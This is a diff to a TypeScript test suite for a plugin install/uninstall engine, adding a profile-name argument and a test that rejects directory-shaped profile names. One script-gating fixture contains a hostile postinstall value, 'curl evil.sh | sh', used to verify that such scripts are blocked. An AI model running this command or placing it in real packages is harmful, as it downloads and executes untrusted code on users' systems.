@@ -108,7 +108,7 @@ describe('lifecycle engine happy path', () => {
   it('runs plan→confirm→execute to restart-pending with exact command shape', async () => {
     const h = makeHarness();
     cleanup.push(() => void 0);
-    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir);
+    const built = h.engine.buildPlan(ghEntry(), 'install', 'web', h.profileDir);
     expect(built.ok).toBe(true);
     if (!built.ok) return;
     const confirmed = h.engine.confirmPlan(built.data.plan.planId, built.data.phrase);
@@ -124,7 +124,7 @@ describe('lifecycle engine happy path', () => {
     expect(spec.args).toEqual([
       'plugin',
       '--profile',
-      h.profileDir,
+      'web',
       'add',
       `git+https://github.com/AI-Scarlett/dsh-safe-plugin-manager.git#${COMMIT}`,
     ]);
@@ -143,7 +143,7 @@ describe('lifecycle engine happy path', () => {
 
   it('refuses to execute without prior confirmation', async () => {
     const h = makeHarness();
-    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir);
+    const built = h.engine.buildPlan(ghEntry(), 'install', 'web', h.profileDir);
     if (!built.ok) throw new Error('build failed');
     const executed = await h.engine.applyPlan(built.data.plan.planId);
     expect(executed.ok).toBe(false);
@@ -157,7 +157,7 @@ describe('rollback semantics', () => {
     const pkgPath = join(h.profileDir, 'package.json');
     const original = readFileSync(pkgPath, 'utf8');
 
-    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir);
+    const built = h.engine.buildPlan(ghEntry(), 'install', 'web', h.profileDir);
     if (!built.ok) throw new Error('build failed');
     h.engine.confirmPlan(built.data.plan.planId, built.data.phrase);
     const executed = await h.engine.applyPlan(built.data.plan.planId);
@@ -174,7 +174,7 @@ describe('rollback semantics', () => {
     const patchPath = join(h.profileDir, 'cordis.patch.yml');
     const original = readFileSync(patchPath, 'utf8');
 
-    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir);
+    const built = h.engine.buildPlan(ghEntry(), 'install', 'web', h.profileDir);
     if (!built.ok) throw new Error('build failed');
     h.engine.confirmPlan(built.data.plan.planId, built.data.phrase);
     const executed = await h.engine.applyPlan(built.data.plan.planId);
@@ -186,7 +186,7 @@ describe('rollback semantics', () => {
 
   it('leaves a backup on disk for forensics even on success', async () => {
     const h = makeHarness();
-    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir);
+    const built = h.engine.buildPlan(ghEntry(), 'install', 'web', h.profileDir);
     if (!built.ok) throw new Error('build failed');
     h.engine.confirmPlan(built.data.plan.planId, built.data.phrase);
     await h.engine.applyPlan(built.data.plan.planId);
@@ -202,6 +202,7 @@ describe('script gating and uninstall', () => {
     const built = h.engine.buildPlan(
       ghEntry({ scriptsPolicy: 'none' }),
       'install',
+      'web',
       h.profileDir,
       { scripts: { postinstall: 'curl evil.sh | sh' }, name: 'zdsh-store' },
     );
@@ -215,9 +216,16 @@ describe('script gating and uninstall', () => {
     expect(detectLifecycleScripts({})).toEqual([]);
   });
 
+  it('rejects a directory-shaped profile name at staging (CP-1 gate)', () => {
+    const h = makeHarness();
+    const built = h.engine.buildPlan(ghEntry(), 'install', h.profileDir, h.profileDir);
+    expect(built.ok).toBe(false);
+    if (!built.ok) expect(built.error.code).toBe('invalid_plan');
+  });
+
   it('uninstall builds remove command shape', async () => {
     const h = makeHarness();
-    const built = h.engine.buildPlan(ghEntry(), 'uninstall', h.profileDir);
+    const built = h.engine.buildPlan(ghEntry(), 'uninstall', 'web', h.profileDir);
     if (!built.ok) throw new Error('build failed');
     h.engine.confirmPlan(built.data.plan.planId, built.data.phrase);
     const executed = await h.engine.applyPlan(built.data.plan.planId);
@@ -225,7 +233,7 @@ describe('script gating and uninstall', () => {
     expect((h.commands[0] as CommandSpec).args).toEqual([
       'plugin',
       '--profile',
-      h.profileDir,
+      'web',
       'remove',
       'zdsh-store',
     ]);
